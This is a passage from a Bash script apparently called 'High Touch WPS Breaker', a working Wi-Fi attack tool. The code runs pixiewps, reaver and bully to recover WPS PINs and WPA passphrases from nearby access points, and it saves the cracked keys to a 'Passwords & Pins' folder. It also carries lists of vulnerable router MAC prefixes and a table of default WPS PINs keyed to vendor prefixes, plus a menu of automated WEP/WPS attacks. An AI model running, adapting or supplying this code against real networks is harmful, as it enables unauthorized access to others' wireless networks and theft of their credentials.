                                    		CHANNEL_AC=`cat ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt | sed -n 4p | cut -c20-`
                                    		Key_Hex_AC=`cat ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt | sed -n 5p | awk -F\" '{print $2}'`
                                    		Key_AC=`cat ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt | sed -n 6p | awk -F\" '{print $2}'`
                                    else
                                    		CHANNEL_AC=`cat ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt | sed -n 3p | cut -c20-`
                                    		PIN_AC=`cat ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt | sed -n 4p | awk -F\" '{print $2}'`
                                    		Key_AC=`cat ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt | sed -n 5p | awk -F\" '{print $2}'`
                                    		time_taken_AC=`cat ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt | sed -n 6p | cut -c20-`
                                	fi
                                    cr_date_AC=`cat ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt | sed -n 7p | cut -c20-`
									echo ""
									echo -e " ${Red} [${Yellow}+${Red}]$BGreen $BSSID$White is already cracked : "
                                    echo ""
									echo -e "${White}           [+]${Yellow} ESSID      ${Red}>>${Cyan} $ESSID_AC" 
									echo -e "${White}           [+]${Yellow} BSSID      ${Red}>>${Cyan} $BSSID_AC"
									echo -e "${White}           [+]${Yellow} Channel    ${Red}>>${White} $CHANNEL_AC"
									if [ "$Ver_WEP" != "" ]
                                    	then
                                    		echo -e "${White}           [+]${Yellow} Hex Key    ${Red}>>${White} \"${Green}$Key_Hex_AC${White}\""
                                    		echo -e "${White}           [+]${Yellow} ASCII Key  ${Red}>>${White} \"${Green}$Key_AC${White}\""
                                    else
											echo -e "${White}           [+]${Yellow} PIN        ${Red}>>${White} \"${Green}$PIN_AC${White}\""
											echo -e "${White}           [+]${Yellow} Key        ${Red}>>${White} \"${Green}$Key_AC${White}\""
											echo -e "${White}           [+]${Yellow} Time Taken ${Red}>>${White} $time_taken_AC"
									fi
									echo -e "${White}           [+]${Yellow} Date       ${Red}>>${White} $cr_date_AC"
									v=0
									TIME2RE=0
									Cracking_Retry=9796
							elif [ "$PRIVACY" == "WEP" ]
								then
								    trap kill_wep_function SIGINT
								    WEP_function
						            trap exit_function SIGINT
						            Cracking_Retry=9796
						            v=0
						    elif [ "$HHDP" -eq "1" ]
						    	then
						    		if [ "$HHDP_GEN" -eq 0 ]
						    			then
						    				PIN=`echo $((PIN$(echo $BSSID | tr -d ":")[1]))`
						    		fi
						    		Cracking_Retry=9796
						    		v=1
							else
									if [ "$MULTI_ATTACK" -eq "0" ] && [ "$sw" -eq "0" ] || [ "$MA" -eq "1" ] && [ "$Cracking_Retry" -eq "1" ]
										then
						   					echo ""
         						    		echo -e "${White} [${Red}!${White}] Wait until$Green the required arguments$White are captured :"
						            		echo ""
						            		sleep 1
						            		sw=1
						            fi
						            TS1=""
									TS2=""
									TD=""
									if [ "${#ESSID}" -gt 5 ]
									then
									for (( TS=6;TS<=${#ESSID};TS++))
												do
													TS2=${TS2}' '
											done
											for (( TS=1;TS<=${#ESSID};TS++))
												do
													TD=${TD}-
											done
									else
											Nu_TS=$((5-${#ESSID}))
											for (( TS=1;TS<=${Nu_TS};TS++))
												do
													TS1=${TS1}' '
											done
											for (( TS=1;TS<=5;TS++))
												do
													TD=${TD}-
											done
									fi
									if [ "$MA" -lt "10" ]
										then
											ID="0$MA"
										else
											ID="$MA"
									fi
									if [ "$Cracking_Retry" -eq 1 ]
										then
											echo -e "${White} +${Yellow}----${White}+${Yellow}--${TD}--${White}+${Yellow}---------------------${White}+"
											echo -e "${Yellow} |${Red} ID ${Yellow}|${Cyan}  ESSID${TS2}  ${Yellow}|${Green}  BSSID              ${Yellow}|"
											echo -e "${White} +${Yellow}----${White}+${Yellow}--${TD}--${White}+${Yellow}---------------------${White}+"
						   					echo -e "${Yellow} |${White} $ID ${Yellow}|${White}  $ESSID${TS1}  ${Yellow}|${White}  ${BSSID}  ${Yellow}|"
						   					echo -e "${White} +${Yellow}----${White}+${Yellow}--${TD}--${White}+${Yellow}---------------------${White}+"
						   			fi
						   			trap kill_reaver SIGINT
									if [ "$Cracking_Retry" -ge 2 ]
										then
											echo -e "${White}[${Red} !! ${White}] Wait until$Green the required arguments$White are captured again ."
											BI=1
											arguments
									else
											BI=0
						            		arguments
						            fi
						            trap exit_function SIGINT
						            rm -rf ${Temporary}/empty.txt
									v=1
						   fi
                           if [ "$WPS" == "" ] && [ $v -eq 1 ]
                                then
									 if [ "$e" != "" ] && [ "$r" != "" ] && [ "$s" != "" ] && [ "$z" != "" ] && [ "$a" != "" ] && [ "$n" != "" ] && [ "$m" != "" ] || [ "$HHDP" -eq "1" ]
									      then
                                              if [ "$Ver_PIN" == "0" ]; then
                                              	  if [ "$HHDP" -eq "0" ]
                                              	  	then
                                              	  trap kill_load SIGINT
                                              	  Last=0
                                              	  if [ "$Cracking_Retry" -lt 3 ]
                                              	  		then
                                                  			pixiewps -e $e -r $r -s $s -z $z -a $a -n $n -v 3 --start 10/2011 --end 11/2011 | tee ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt > /dev/null &
                                                  			PID="$!"
                                                  			Wait_Msg="$Red Wait until the$Green PIN$Red is cracked,this may take few seconds ...$White"
                                                  else
                                                  			pixiewps -f -e $e -r $r -s $s -z $z -a $a -n $n -m $m -b $BSSID | tee ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt > /dev/null &
                                                  			PID="$!"
                                                  			Wait_Msg="$Red Wait until the$Green PIN$Red is cracked,this may take around 30 minutes ...$White"
                                                  			Cracking_Retry=9796
                                                  			Last=1
                                                  fi
												  End_Msg="Cracking process is done , the $Green Result$White is as follows :"
                								  Loading
									              PIN=`less ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt | grep 'WPS pin:' | awk '{print $4}'`
									              time_taken=`less ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt | grep -w "Time taken" | cut -c18-`
									          	  fi
									          	  cr_date=`date`
									              if [ "$PIN" != "" ]
									                   then
									                   		if [ "$HHDP" -eq "0" ]
									                   			then
									                        echo " [+] ESSID      >> $ESSID" > ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
									                        echo " [+] BSSID      >> $BSSID" >> ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
									                        echo " [+] Channel    >> $CHANNEL" >> ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
									                        echo " [+] PIN        >> \"$PIN\"" >> ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
									                        echo ""
													        echo -e "${White}       [+] PIN  >>${Green} $PIN"
													        echo -e "${White}       [+] Time taken >>${Red} $time_taken"
															echo ""
															fi
													        hash bully 2> /dev/null
															hash_bully="$?"
															ByPASS_Result=0
															if [ "$PIN_NUM" -ge "1" ]
																then
																	trap kill_reaver SIGINT
																	Try_Multi_PIN_REAVER
																	tset
																	trap exit_function SIGINT
															elif [ $hash_bully -eq 0 ]
															     then
										                             echo ""
										                             echo -e "$White [+] Running$Green bully$White with the correct$Green PIN$White, wait ..."
											                         echo ""
										                             bully -b $BSSID -c $CHANNEL -B -F -p $PIN -e "$ESSID" $mon > ${Temporary}/Get_Pass.txt 2> /dev/null &
										                             PID="$!"
										                             Wait_Msg="Wait until the${Green} Bully${white} is${Red} finished${White} ."
										                             End_Msg="The process of${Green} Bully${White} has completed${Green} successfully${White}."
										                             Loading
										                             Key=`cat ${Temporary}/Get_Pass.txt | grep -w key | awk -F\' '{print $4}'`
													                 echo " [+] Key        >> \"$Key\"" >> ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
																 else
																     echo ""
																	 echo -e "$White [+] Running$Green reaver$White with the correct$Green PIN$White, wait ..."
																	 echo ""
																	 reaver -i $mon -b $BSSID -c $CHANNEL -e "$ESSID" -n -vv -p $PIN > ${Temporary}/Get_Pass.txt &
																	 PID="$!"
																	 Wait_Msg="Wait until the${Green} Reaver${white} is${Red} finished${White} ."
																	 End_Msg="The process of${Green} Reaver${White} has completed${Green} successfully${White}."
																	 Loading
																	 Key=`cat ${Temporary}/Get_Pass.txt | grep -w "WPA PSK" | awk -F\' '{print $2}'`
																	 echo " [+] Key        >> \"$Key\"" >> ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
															fi
															if [ "$ByPASS_Result" -eq "0" ]
																then
																	echo " [+] Time Taken >> $time_taken" >> ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
																	echo " [+] Date       >> $cr_date" >> ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
																	echo ""
																	echo -e "${White} [+]${Yellow} ESSID      ${Red}>>${Cyan} $ESSID" 
									                        		echo -e "${White} [+]${Yellow} BSSID      ${Red}>>${Cyan} $BSSID"
									                        		echo -e "${White} [+]${Yellow} Channel    ${Red}>>${White} $CHANNEL"
									                        		echo -e "${White} [+]${Yellow} PIN        ${Red}>>${White} \"${Green}$PIN${White}\""
									                        		echo -e "${White} [+]${Yellow} Key        ${Red}>>${White} \"${Green}$Key${White}\""
									                        		if [ "$HHDP" -eq "0" ]
									                        			then
									                        				echo -e "${White} [+]${Yellow} Time Taken ${Red}>>${White} $time_taken"
									                        		fi
																	echo -e "${White} [+]${Yellow} Date       ${Red}>>${White} $cr_date"
																	echo ""
									                        		echo -e "$White [${Yellow}+${White}]$Green Congratulation ${White}(${Red}^${White}_${Red}^${White})"
													        		echo ""
													        fi
													        if [ "$HHDP" -eq 0 ]
													        	then
													        		PIN_COLOR[$MA]=$White
													        else
													        		PIN_COLOR[$MA]=$Purple
													        fi
													        Mu_PIN[$MA]=$PIN
													        Mu_KEY[$MA]=$Key
													        Cracking_Retry=9796
									               else
									               		TIME2RE=`less ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt | grep "Time" | awk '{print $4}'`
									               		if [[ "$TIME2RE" =~ ^[+-]?[0-9]+$ ]]
									               			then
									               				if [ "$TIME2RE" -lt "4" ] || [ "$Last" -eq "1" ]
									               					then
									               						cat ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt | head -n 7 | tail -n 5 2> /dev/null
									               						echo ""
												    					echo -e "$White        [${Red}!${White}] Sorry pin not found , good luck next time."
												    					echo ""
												    					rm -rf ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
												    			else
												    					echo ""
												    					echo -e "$White        [${Red}!${White}]${Red} $Cracking_Retry${White} attempt is${Red} Failed ."
												    					echo ""
												    			fi
												    	elif [ "$Last" -eq "1" ]
												    		then
												    					cat ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt | head -n 7 | tail -n 5 2> /dev/null
									               						echo ""
												    					echo -e "$White        [${Red}!${White}] Sorry pin not found , good luck next time."
												    					echo ""
												    					rm -rf ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
												    	else
												    			TIME2RE=10
												    	fi
									               fi
											  fi
									      else
									      		TIME2RE=0
									      		Cracking_Retry=9796
									      		echo -e "$Red [!]$Yellow Not all required arguments have been supplied!"
									      		echo ""
									  fi
                           fi
                       	done
                       	   if [ "${#Vun_BSSID[@]}" -eq "$MA" ] && [ "$MULTI_ATTACK" -eq 1 ]
                       	   		then
                       	   			echo -e "${White} [${Green} ok${White} ] The process of${Cyan} Multi${White}-${Cyan}Attack${White} has completed , The result is as follows :"
                       	   			max_ESSID=5
									max_BSSID=5
									max_PIN=3
                           			max_Key=3
                       	   			for (( loop=1;loop<=${#Vun_BSSID[@]};loop++))
						   				do
						   					FINAL_ESSID[$loop]=${Vun_ESSID[$loop]}
						   					FINAL_CHANNEL[$loop]=$(echo ${Vun_CHANNEL[$loop]}|tr -d [:space:])
						   					FINAL_BSSID[$loop]=${Vun_BSSID[$loop]}
						  					FINAL_PRIVACY[$loop]=${Vun_PRIVACY[$loop]}
						  					FINAL_ESSID[$loop]=${Vun_ESSID[$loop]}
						  					FINAL_PIN[$loop]=${Mu_PIN[$loop]}
						  					FINAL_KEY[$loop]=${Mu_KEY[$loop]}
						  					if [ "${#FINAL_ESSID[$loop]}" -gt "$max_ESSID" ]
						  						then
						  							max_ESSID=${#FINAL_ESSID[$loop]}
						  					fi
						  					if [ "${#FINAL_KEY[$loop]}" -gt "$max_Key" ]
						  						then
						  							max_Key=${#FINAL_KEY[$loop]}
						  					fi
						  					if [ "${#FINAL_PIN[$loop]}" -gt "$max_PIN" ]
						  						then
						  							max_PIN=${#FINAL_PIN[$loop]}
						  					fi
						  					if [ "${#FINAL_BSSID[$loop]}" -gt "$max_BSSID" ]
						  						then
						  							max_BSSID=${#FINAL_BSSID[$loop]}
						  					fi
						   			done
						   			If_Print_Num="${#Vun_BSSID[@]}"
						   			for (( loop=1;loop<=${#Vun_BSSID[@]};loop++))
						   				do
						   					column=1
						   					Calc_Table1 5 $max_ESSID
											Calc_Table ${#FINAL_ESSID[$loop]} $max_ESSID
											column=$((column+1))
											Calc_Table1 5 $max_BSSID
											Calc_Table ${#FINAL_BSSID[$loop]} $max_BSSID
											column=$((column+1))
											Calc_Table1 3 $max_PIN
											Calc_Table ${#FINAL_PIN[$loop]} $max_PIN
											column=$((column+1))
											Calc_Table1 3 $max_Key
											Calc_Table ${#FINAL_KEY[$loop]} $max_Key
											if [ $menu -eq 1 ]
												then
													SPCS[1]=${SPCS[1]}' '
													Dshs[1]=${Dshs[1]}'-'
											fi
											if [ "$loop" -eq 1 ]
												then
													echo ""
       					   							echo -e "${White} +${Yellow}----${White}+${Yellow}------${Dshs[1]}------${Dshs[2]}------${Dshs[3]}-----${Dshs[4]}${White}+"
													echo -e "${Yellow} |${Red} ID ${Yellow}|${Cyan} ESSID${SPCS[1]}${Yellow}|${Cyan} BSSID${SPCS[2]}${Yellow}|${Cyan} PIN${SPCS[3]}${Yellow}|${Cyan} KEY${SPCS[4]}${Yellow}|"
													echo -e "${White} +${Yellow}----${White}+${Yellow}------${Dshs[1]}------${Dshs[2]}------${Dshs[3]}-----${Dshs[4]}${White}+"
													DSHS=$(echo -e "${White} +${Yellow}----${White}+${Yellow}------${Dshs[1]}------${Dshs[2]}------${Dshs[3]}-----${Dshs[4]}${White}+")
											fi
											ESSID=$(echo ${FINAL_ESSID[$loop]})
						   					if [[ "$If_Print_Num" -lt "10" ]]; then
                          							echo -e "${Yellow} |${White} 0$loop ${Yellow}|${White} ${ESSID}${SPC[1]} ${Yellow} |${White} ${FINAL_BSSID[$loop]}${SPC[2]}${Yellow} |${PIN_COLOR[$loop]} ${FINAL_PIN[$loop]}${SPC[3]}${Yellow} |${Green} ${FINAL_KEY[$loop]}${SPC[4]}${Yellow} |"
                          						else
                        							echo -e "${Yellow} |${White} $loop ${Yellow}|${White} ${ESSID}${SPC[1]} ${Yellow} |${White} ${FINAL_BSSID[$loop]}${SPC[2]}${Yellow} |${PIN_COLOR[$loop]} ${FINAL_PIN[$loop]}${SPC[3]}${Yellow} |${Green} ${FINAL_KEY[$loop]}${SPC[4]}${Yellow} |"
                        					fi
                        			done
                        			echo $DSHS
						   			tset
						   fi
                           if [ "$MULTI_ATTACK" -eq 0 ] || [ "${#Vun_BSSID[@]}" -eq "$MA" ]
                           		then
                           			trap exit_function SIGINT
						   			echo ""
						   			echo ""
						   			echo -e "$Yellow       [0]$BWhite Back to list of wireless networks."
						   			echo -e "$Yellow       [1]$BWhite Back to main menu."
						   			echo -e "$Yellow       [2]$BRed exit."
						   			echo ""
						   			echo ""
						   			back="3"
						   			while [ "$back" != "0" ] && [ "$back" != "1" ] && [ "$back" != "2" ] && [ "$back" != "\n" ]
						   			     do
										   echo -en "\033[1A\033[2K"
						   			       echo -e -n "$White            [+] Select$BRed one$White thing from the menu :"
						   			       read back
						   			done
						   fi
						   tset
}
End_OF_THE_SCRIPT(){
					trap "" SIGINT
					echo -e "$White [${Red}!${White}] Remove any temporary file."
					rm -rf ${Temporary}
					sleep 1
					echo ""
					if [ "$mode_monitor" == "active" ]
    					then
        					echo -e "$White [${Red}!${White}]$Red Stop$White the ${Green}Monitor Mode$White."
        					ifconfig $mon down && iwconfig $mon mode managed && ifconfig $mon up > /dev/null 2> /dev/null &
        					echo ""
					fi
					echo -e "$White [${Red}+${White}]$Green Greetz to ${White}: ${Cyan}AKAS${White} &&${Cyan} Fantome195${White} ."
					echo ""
					echo -e "             ${Green}########################################################"
					sleep 0.1
					echo -e "             ##                ${Yellow}{Full Information}${Green}                  ##"
					sleep 0.1
					echo -e "             ##   ${Cyan}-Author   ${White}:      {${Yellow} Silent Ghost ${White}}                ${Green}##"
					sleep 0.1
					echo -e "             ##   ${Cyan}-Country  ${White}:      {${Red} Morocco ${White}}                     ${Green}##"
					sleep 0.1
					echo -e "             ##   ${Cyan}-Email    ${White}:      {${Purple} silent-ghostx@outlook.com ${White}}   ${Green}##"
					sleep 0.1
					echo -e "             ########################################################"
					sleep 0.1
					echo -e "$DefaultColor"
}
GENERATED_PIN_MAC_LIST="00:02:CF
00:08:5C
00:13:49
00:1A:2A
00:1A:A1
00:1C:A8
00:22:93
00:23:F8
00:26:75
00:27:19
00:66:4B
00:E0:4D
0C:37:DC
10:7B:EF
12:08:C1
14:CC:20
18:28:61
18:28:61
18.28:61
1C:7E:E5
20:08:ED
24:C9:A1
28:28:5D
2C:AB:25
30:B5:C2
4C:21:D0
4C:ED:DE
50:67:F0
54:E6:FC
64:66:B3
68:72:51
70:72:3C
74:EA:3A
80:1F:02
80:A1:D7
88:41:FC
90:F6:52
94:0C:6D
9C:D2:4B
A0:F3:C1
A4:99:47
B0:B2:DC
BC:F6:85
C0:4A:00
C4:6E:1F
C8:3A:35
C8:6C:87
C8:D5:FE
CC:7B:35
CC:B2:55
D8:50:E6
DC:02:8E
DC:9F:DB
DE:71:44
E4:77:23
E8:CD:2D
E8:DE:27
EC:43:F6
F8:1A:67
F8:1A:67
F8:3D:FF
F8:D1:11
F8:D1:11
FC:F5:28
"
Default_PIN_MAC_LIST="0=7C:03:4C 7C:D3:4C 4C:17:EB
1=00:19:15
2=F4:3E:61 00:1F:A4
3=40:4A:03
4=00:1A:2B
5=38:72:C0
6=FC:F5:28
7=30:39:F2
8=74:88:8B
9=A4:52:6F
10=DC:0B:1A
11=90:F6:52
12=00:0C:C3
13=C8:D3:A3
14=7B:48:77
15=72:E3:70
16=F5:9B:36
17=00:A0:26
18=20:F3:A3
19=98:FC:11
20=00:0B:3B
21=00:0C:F1
22=00:11:6B
23=00:18:02
24=00:48:7A
25=00:1D:19
26=00:1D:73
27=00:1D:7E
28=00:21:29
29=00:21:91
30=00:24:01
31=00:24:17
32=00:24:8C
33=00:26:24
34=00:4F:62
35=00:26:5A
36=00:26:E8
37=00:38:72"
Default_PIN_MAC[0]="3 7C:03:4C 7C:D3:4C 4C:17:EB 43944552 12345670"
Default_PIN_MAC[1]="1 00:19:15 12345670"
Default_PIN_MAC[2]="2 F4:3E:61 00:1F:A4 12345670"
Default_PIN_MAC[3]="1 40:4A:03 11866428"
Default_PIN_MAC[4]="1 00:1A:2B 88478760 15624697"
Default_PIN_MAC[5]="1 38:72:C0 18836486 20172527"
Default_PIN_MAC[6]="1 FC:F5:28 20329761"
Default_PIN_MAC[7]="1 30:39:F2 16538061 16702738 18355604 88202907 73767053 43297917 19756967 13409708"
Default_PIN_MAC[8]="1 74:88:8B 43297917 73767053 88202907 16538061 16702738 18355604 19756967 13409708"
Default_PIN_MAC[9]="1 A4:52:6F 16538061 88202907 73767053 16702738 43297917 18355604 19756967 13409708"
Default_PIN_MAC[10]="1 DC:0B:1A 16538061 16702738 18355604 88202907 73767053 43297917 19756967 13409708"
Default_PIN_MAC[11]="1 90:F6:52 12345670"
Default_PIN_MAC[12]="1 00:0C:C3 47392717 12345670"
Default_PIN_MAC[13]="1 C8:D3:A3 20172527 17084215 1234567"
Default_PIN_MAC[14]="1 7B:48:77 25142457"
Default_PIN_MAC[15]="1 72:E3:70 75293284"
Default_PIN_MAC[16]="1 F5:9B:36 60960542"
Default_PIN_MAC[17]="1 00:A0:26 84385727"
Default_PIN_MAC[18]="1 20:F3:A3 25905892"
Default_PIN_MAC[19]="1 98:FC:11 21421112"
Default_PIN_MAC[20]="1 00:0B:3B 3814"
Default_PIN_MAC[21]="1 00:0C:F1 30447028"
Default_PIN_MAC[22]="1 00:11:6B 3042"
Default_PIN_MAC[23]="1 00:18:02 16546615"
Default_PIN_MAC[24]="1 00:48:7A 15471628"
Default_PIN_MAC[25]="1 00:1D:19 12345670 66026402"
Default_PIN_MAC[26]="1 00:1D:73 88420707"
Default_PIN_MAC[27]="1 00:1D:7E 66026402"
Default_PIN_MAC[28]="1 00:21:29 64637129 22310298"
Default_PIN_MAC[29]="1 00:21:91 82744458"
Default_PIN_MAC[30]="1 00:24:01 97744757 10987957"
Default_PIN_MAC[31]="1 00:24:17 31011193"
Default_PIN_MAC[32]="1 00:24:8C 34693841"
Default_PIN_MAC[33]="1 00:26:24 95374611"
Default_PIN_MAC[34]="1 00:4F:62 21207136"
Default_PIN_MAC[35]="1 00:26:5A 76971464 17245685 96119433"
Default_PIN_MAC[36]="1 00:26:E8 15483607"
Default_PIN_MAC[37]="1 00:38:72 18836486 1562"
Vun_MAC_LIST="00:02:6F
00:05:CA
00:0C:F6
00:11:6B
00:14:5C
00:18:E7
00:19:15
00:1D:D3
00:1D:D4
00:22:75
00:22:F7
00:23:69
00:26:5B
00:4F:81
00:A0:26
08:7A:4C
0C:96:BF
14:B9:68
14:CF:E2
18:17:25
20:08:ED
20:73:55
24:09:95
28:28:5D
48:EE:0C
58:1F:28
5C:35:3B
60:E7:01
62:23:3D
62:53:D4
62:55:9C
62:6B:D3
62:7D:5E
62:A8:E4
62:A8:E4
62:C0:6F
62:CB:A8
68:A0:F6
68:B6:FC
6A:23:3D
6A:3D:FF
6A:96:BF
6A:A8:E4
6A:C0:6F
6A:C6:1F
6A:CB:A8
6A:CD:BE
6C:B0:CE
72:23:3D
72:3D:FF
72:55:9C
72:6B:D3
72:7D:5E
72:A8:E4
72:C0:6F
72:CB:A8
72:CD:BE
74:DA:38
78:54:2E
80:1F:02
80:37:73
80:3F:5D
82:96:65
82:D8:B6
84:C9:B2
8C:09:F4
90:0D:CB
90:1A:CA
90:C7:92
92:EF:68
A6:01:C0
A6:02:C0
A6:0B:42
A6:0C:83
A6:0C:C3
A6:10:04
A6:20:88
A6:3D:4F
A6:3E:CF
A6:40:10
A6:44:11
A6:52:14
A6:5D:57
A6:63:D8
A6:6A:5A
A6:78:9E
A6:7B:9E
A6:88:22
A6:8D:E3
A6:8E:E3
A6:A3:A8
A6:A6:69
A6:AB:AA
A6:B1:6C
A6:B2:6C
A6:B9:EE
A6:BD:AF
A6:CF:F3
A6:D5:B5
A6:DA:36
A6:DB:B6
A6:DE:F7
A6:E1:38
A6:E2:F8
A6:EB:7A
A6:EB:BA
AC:B3:13
B0:48:7A
B2:46:FC
BC:14:01
BC:14:0C
C0:4A:00
C4:39:3A
C4:A8:1D
CE:03:00
CE:28:4A
CE:31:0C
CE:6E:1B
CE:70:9C
CE:7F:1F
CE:98:66
CE:BC:6F
CE:C1:70
D0:7A:B5
D8:FE:E3
DC:53:7C
E2:EB:FA
E8:3E:FC
E8:CD:2D
E8:ED:05
F4:C7:14
F8:1B:FA
F8:63:94
F8:8B:86
F8:C3:46
FE:D9:F6"
re='y'
while [ "$re" == 'y' ] || [ "$re" == 'yes' ] ||[ "$re" == 'o' ] || [ "$re" == 'oui' ]
do
re=nothing
echo -ne '\033c'
trap RM_HT_FOLDER SIGINT SIGQUIT SIGTSTP
echo ""
sleep 0.1
echo -e $Cyan   "    +${Yellow}-------------------------------------------------------------------${Cyan}+"
sleep 0.1
echo -e $Yellow   "    |                                                                   |"
sleep 0.1
echo -e "     |$Red   ██╗  ██╗████████╗   ${Green}██╗    ██╗██████╗ ███████╗ ${BCyan}██${Yellow}╗${BCyan} ██${Yellow}╗ ${Purple}██████╗ $Yellow |"
sleep 0.1    
echo -e "     |$Red   ██║  ██║╚══██╔══╝   ${Green}██║    ██║██╔══██╗██╔════╝${Red}████████${Yellow}╗${Purple}██╔══██╗$Yellow |"   
sleep 0.1
echo -e "     |$BRed   ███████║   ██║${White}█████╗${BGreen}██║ █╗ ██║██████╔╝███████╗${Yellow}╚${BCyan}██${Yellow}╔═${BCyan}██${Yellow}╔╝${BPurple}██████╔╝$Yellow |"  
sleep 0.1 
echo -e "     |$BRed   ██╔══██║   ██║${White}╚════╝${BGreen}██║███╗██║██╔═══╝ ╚════██${Yellow}║${Red}████████${Yellow}╗${BPurple}██╔══██╗$Yellow |" 
sleep 0.1
echo -e "     |$Red   ██║  ██║   ██║      ${Green}╚███╔███╔╝██║     ███████║${Yellow}╚${BCyan}██${Yellow}╔═${BCyan}██${Yellow}╔╝${Purple}██████╔╝$Yellow |" 
sleep 0.1
echo -e "     |$Red   ╚═╝  ╚═╝   ╚═╝      ${Green} ╚══╝╚══╝ ╚═╝     ╚══════╝${Yellow} ╚═╝ ╚═╝ ${Purple}╚═════╝ $Yellow |"  
sleep 0.1
echo -e "     |                                                                   |"
sleep 0.1
echo -e $Cyan   "    +${Yellow}-------------------------------------------------------------------${Cyan}+${Yellow}"
sleep 0.1
echo -e "                          |${BRed} High${BYellow} Touch${BPurple} WPS${BGreen} Breaker${Yellow} |"
sleep 0.1
echo -e "                          ${Cyan}+${Yellow}------------------------${Cyan}+"
sleep 0.1
Ver_User=`whoami`
if [ "$Ver_User" != "root" ]
	then
		echo -e "$Yellow     +${White}-------------------------------------------------------------------${Yellow}+"
		echo -e "${White}     | [${Red}!${White}] You need to launch the script as the root user , run it with  ${White}|"
		echo -e "${Yellow}     +${White}-------------------------------------------------------------------${Yellow}+"
		echo -e "${White}     | ${Red}                 \$${White}=> sudo ${Yellow}./${Green}HT${White}-${Green}WB${White}.${Green}sh${White}                              |"
		echo -e "${White}     | ${Red}                 \$${White}=> sudo ${Blue}bash ${Green}HT${White}-${Green}WB${White}.${Green}sh${White}                           |"
		echo -e "${Yellow}     +${White}-------------------------------------------------------------------${Yellow}+"
		echo ""
		echo ""
else
echo -e "$Yellow     +${White}-------------------------------------------------------------------${Yellow}+"
echo -e "${White}     | ${Yellow} ID ${White} |                   ${BPurple}   Name                             ${White}     |"
echo -e "${Yellow}     +${White}-------------------------------------------------------------------${Yellow}+"
echo -e "${White}     | ${Red}[${Yellow}01${Red}]${White} |$Green Attack automatically with${Cyan} Wash${White} .        (${Red}WPS${Green}{${Yellow}WPA${White}/${Yellow}WPA2${Green}}${White})    |"
echo -e "${White}     | ${Red}[${Yellow}02${Red}]${White} |$Green Attack automatically with${Cyan} Airodump-ng${White} . (${Red}WEP${White}/${Red}WPS${Green}{${Yellow}WPA${White}/${Yellow}WPA2${Green}}${White})|"
echo -e "${White}     | ${Red}[${Yellow}03${Red}]${White} |$Green Manuel input${White} .                                             |"
echo -e "${White}     | ${Red}[${Yellow}04${Red}]${White} |$Green If you want to crack an acces point's key with$BRed WPS PIN${White} .   |"
echo -e "${White}     | ${Red}[${Yellow}05${Red}]${White} |$Green If you want to crack a$BRed Hidden$Green acces point${White} .                |"
echo -e "${White}     | ${Red}[${Yellow}06${Red}]${White} |$Green ${Green}Enable${White} or ${Red}Disable${White} The${Cyan} Monitor Mode${White} .                       |"
echo -e "${White}     | ${Red}[${Yellow}07${Red}]${White} |$Green Exit${White} .${White}                                                     |"
echo -e "${Yellow}     +${White}-------------------------------------------------------------------${Yellow}+"
echo ""
echo -e -n "$White    ${Red} [${Cyan}!${Red}]$White Type the$BRed ID$White of your choice : "
read menu
menu=`expr $menu + 0 2> /dev/null`
case $menu in
             "1")
			     Ver_Pckg_Tools
				 Ver_Mon_WCar_Fun
                 if [ "$VerMon" != "" ]
                      then
                           Ver_Mon_Fun
						   trap kill_wash SIGINT
						   wash -i $mon -C -o ${Temporary}/wash.txt > /dev/null &
						   WashID="$!"
						   disown $WashID
						   for ((c=0; c<=3; c++))
						         do
						           echo -ne "\r[00:${Green}0${c}$White]$White Click$Green CTRL+C$White when ready,good luck"
								   sleep 1
						   done
						   back=0
						   fin=0
						   num_wireless=-1
						   ti=0
						   while [ "$back" == "0" ]
						   do
						     echo -ne '\033c'
							 echo -e "${White} +${Red}---------------------------------------------------------------------------------${White}+"
						     echo -e "${Red} |${Red} [${Yellow}+${Red}]${White} If the BSSID in$BGreen green$White this mean that device is vulnerable.${Red}                  |"
							 echo -e " |${Red} [${Yellow}+${Red}]${White} If the BSSID in$BYellow yellow$White this mean that device is may be vulnerable or aren't.${Red}|"
							 echo -e " |${Red} [${Yellow}+${Red}]${White} If the BSSID in$BRed red$White this mean the wps of that device is Locked.$Red             |"
							 echo -e " |${Red} [${Yellow}+${Red}]${White} If the BSSID in$Purple Purple$White this mean that device is has a default pin or aren't.${Red}|"
							 echo -e "${White} +${Red}---------------------------------------------------------------------------------${White}+"
						     echo -e ${Yellow}"  ID	${BWhite}BSSID                  CH       PWR     WPS Locked   Ver    ESSID"
						     echo -e $Purple" ~~~~   ~~~~~                  ~~       ~~~     ~~~~~~~~~~   ~~~    ~~~~~"
						     i=0
							 Quit=0
							 NL=1
							 count_rot=0
							 while [ $Quit == 0 ]
								 do
								   cat ${Temporary}/wash.txt | sed '1,2d' > ${Temporary}/wash_nf.txt
								   line=`cat ${Temporary}/wash_nf.txt | sed -n ${NL}p 2> /dev/null`
								   if [ "$line" != "" ]
								      then
								   v=0
								   MAC=`echo $line | awk -F' ' '{print $1}'`
